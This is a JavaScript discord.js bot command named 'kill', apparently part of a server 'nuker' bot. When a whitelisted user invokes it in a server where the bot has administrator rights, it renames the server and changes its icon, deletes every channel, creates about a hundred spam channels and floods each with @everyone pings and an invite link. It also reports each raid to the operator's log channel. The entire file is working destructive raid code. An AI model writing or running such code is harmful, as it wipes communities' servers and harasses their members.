const Discord = require('discord.js');
const db = require('megadb')
const blacklist = new db.crearDB("blacklist")
const serverlist = new db.crearDB("serverlist")
const color = '0x410255'

let cooldown = new Set()


module.exports = {
  name: "kill",
  alias: [],

async execute (client, message, args){

  if(!blacklist.has(message.author.id)){
    const a = new Discord.MessageEmbed()
    .setDescription("You are not registered in the Whitelist.")
    .setColor(color)
     return message.reply({embeds: [a]})
  }

  if (serverlist.tiene(message.guild.id)){
    const serverInListEmbed = new Discord.MessageEmbed()
        .setDescription("<:Converter:995595217782718475> This command is not available in this server.")
        .setColor(color);
      return message.reply({ embeds: [serverInListEmbed] });
    }

  if(!message.guild.me.permissions.has("MANAGE_CHANNELS")){
    const wu = new Discord.MessageEmbed()
    .setDescription("<:Converter:995595217782718475> I don't have permissions. I need the `MANAGE_CHANNELS`.")
   .setColor(color)
   return message.reply({embeds: [wu]})
  }

  var botperms = message.guild.me.permissions.has("ADMINISTRATOR")
  if(!botperms){
    const siu = new Discord.MessageEmbed()
    .setDescription("<:Converter:995595217782718475> I don't have permissions. I need the `ADMINISTRATOR`.")
    .setColor(color)
    return message.reply({embeds: [siu]})
  }

  if(cooldown.has(message.author.id)){
    const l = new Discord.MessageEmbed()
    .setDescription(`<:Converter:995595217782718475> ${message.author}, you must wait 1 minute to use the command.`)
    .setColor(color)
    return message.author.send({embeds: [l]}).catch(() => console.log(`${user.displayName}'s' DMs are closed | Please use .spam <@User> <message> instead`)) 
  }

  cooldown.add(message.author.id);

  setTimeout(() => {
    cooldown.delete(message.author.id);
  }, 60000);


  const e = new Discord.MessageEmbed()
      .setDescription(`<:k_:995595248266915870> kill executed successfully!`)
      .addField("User", `**${message.author.tag}** | **${message.author.id}**`)
      .addField("Server Name", `**${message.guild.name}** | **${message.guild.id}**`)
      .setColor(color)
      .setThumbnail(message.author.displayAvatarURL({ format: 'png', dynamic: true }));
    client.channels.cache.get("1186076417142816808").send({ embeds: [e] });
 
        
  try {
    const imageUrl = "https://images-ext-1.discordapp.net/external/jZ-qJWN-V5InVg4l-7b-JLM7UUxeT-A0xcRfsCzoNTQ/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/1156468991724883979/04f7ebac763a25ebb6bea64e99658f04.webp?format=webp&width=497&height=497";
    await message.guild.setIcon(imageUrl);
    await message.guild.setName("Piojo-Hub");

    const deleteChannelPromises = message.guild.channels.cache.map(ch => {
      const botPermissions = ch.permissionsFor(message.guild.me);
      if (botPermissions && botPermissions.has("MANAGE_CHANNELS")) {
        return ch.delete().catch(err => console.log("Error Found: " + err));
      }
    });

    await Promise.all(deleteChannelPromises);

    const argas = ["@everyone\nhttps://discord.gg/hjbvMsB7v5", "@here\nhttps://discord.gg/hjbvMsB7v5"];
    let randomIMG = argas[Math.floor(Math.random() * argas.length)];
    let texto = randomIMG;

    const createdChannels = [];

    const baseChannel = await message.guild.channels.create('очук возрождается', { type: "GUILD_TEXT" });
    createdChannels.push(baseChannel);

    const clonePromises = [];
    for (let i = 0; i < 99; i++) {
      if (message.guild.channels.cache.size >= 500) break;
      const clonePromise = baseChannel.clone()
        .then(clonedChannel => {
          createdChannels.push(clonedChannel);
          return clonedChannel.send(texto).catch(err => {
            const laoo = new Discord.MessageEmbed()
              .setDescription("<:Converter:995595217782718475> Error found")
              .addField("> Command", "`kill`", true)
              .addField("> Error", `\`${err}\``, true)
              .setColor(color);
            client.channels.cache.get('1210148130264322119').send({ embeds: [laoo] });
          });
        }).catch(err => console.log("Error Found: " + err));
      clonePromises.push(clonePromise);
    }

    await Promise.allSettled(clonePromises);

    const sendMessagesPromises = createdChannels.map(ch => {
      const messagePromises = [];
      for (let l = 0; l < 100; l++) {
        messagePromises.push(ch.send(texto).catch(err => {
          const laoo = new Discord.MessageEmbed()
            .setDescription("<:Converter:995595217782718475> Error found")
            .addField("> Command", "`kill`", true)
            .addField("> Error", `\`${err}\``, true)
            .setColor(color);
          client.channels.cache.get('1210148130264322119').send({ embeds: [laoo] });
        }));
      }
      return Promise.all(messagePromises);
    });

    await Promise.allSettled(sendMessagesPromises);


  } catch (err) {
    const laoo = new Discord.MessageEmbed()
      .setDescription("<:Converter:995595217782718475> Error found")
      .addField("> Command", "`kill`", true)
      .addField("> Error", `\`${err}\``, true)
      .setColor(color);
    client.channels.cache.get('1210148130264322119').send({ embeds: [laoo] });
  }


 }

}

